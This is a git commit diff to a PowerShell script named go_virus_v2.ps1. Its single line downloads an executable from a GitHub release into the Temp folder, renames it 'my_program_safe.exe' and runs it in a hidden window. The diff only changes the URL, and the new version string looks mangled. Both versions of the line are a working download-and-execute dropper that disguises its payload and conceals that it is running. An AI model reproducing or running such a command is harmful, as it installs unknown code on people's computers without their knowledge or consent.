66841200e5ec4ab222a6d594087f3faaa6b2c502
greenstorm5417 <130579625+greenstorm5417@users.noreply.github.com>
2025-02-03 13:56:46 -0500

    Update go_virus_v2.ps1

--- go_virus_v2.ps1
+++ go_virus_v2.ps1
@@ -1,1 +1,1 @@
-Invoke-WebRequest -Uri "https://github.com/greenstorm5417/funny/releases/download/v2.0.3/myprogram.exe" -OutFile "$env:Temp\my_program_safe.exe" -UseBasicParsing; Start-Process -FilePath "$env:Temp\my_program_safe.exe" -Wait -WindowStyle Hidden 
+Invoke-WebRequest -Uri "https://github.com/greenstorm5417/funny/releases/download/v2.0./7myprogram.exe" -OutFile "$env:Temp\my_program_safe.exe" -UseBasicParsing; Start-Process -FilePath "$env:Temp\my_program_safe.exe" -Wait -WindowStyle Hidden 
